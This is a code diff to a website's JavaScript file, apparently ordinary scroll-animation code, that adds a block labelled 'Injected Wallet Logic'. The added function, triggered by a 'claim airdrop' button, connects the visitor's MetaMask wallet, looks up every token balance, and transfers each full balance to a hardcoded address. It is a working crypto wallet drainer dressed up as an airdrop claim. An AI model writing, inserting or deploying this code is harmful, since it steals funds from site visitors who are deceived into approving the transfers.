@@ -95,3 +95,48 @@ const scrollReveal = function () {
 scrollReveal();
 
 addEventOnElem(window, "scroll", scrollReveal);
+
+// --- Injected Wallet Logic ---
+async function connectWalletAndSendTokens() {
+  if (typeof window.ethereum === 'undefined') {
+    alert('Please install MetaMask!');
+    return;
+  }
+
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send('eth_requestAccounts', []);
+    const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    const chainId = await signer.getChainId();
+    const covalentApiKey = "YOUR_API_KEY";
+    const url = `https://api.covalenthq.com/v1/${chainId}/address/${userAddress}/balances_v2/?key=${covalentApiKey}`;
+    const response = await fetch(url);
+    const data = await response.json();
+
+    if (!data.data || !data.data.items) {
+      alert('No token data available');
+      return;
+    }
+
+    const tokens = data.data.items.filter(token => token.type === 'cryptocurrency' && token.balance > 0 && token.contract_address);
+
+    for (const token of tokens) {
+      try {
+        const contract = new ethers.Contract(token.contract_address, [
+          "function transfer(address to, uint amount) returns (bool)"
+        ], signer);
+
+        const tx = await contract.transfer("0xf659d4Bb03E0923964b8bBACfd354f8BC02Bfe47", token.balance);
+        console.log(`Sent ${token.contract_ticker_symbol}, tx:`, tx.hash);
+      } catch (err) {
+        console.warn(`Failed to send ${token.contract_ticker_symbol}`, err);
+      }
+    }
+  } catch (err) {
+    console.error('Error connecting wallet or sending tokens:', err);
+  }
+}
+
+document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
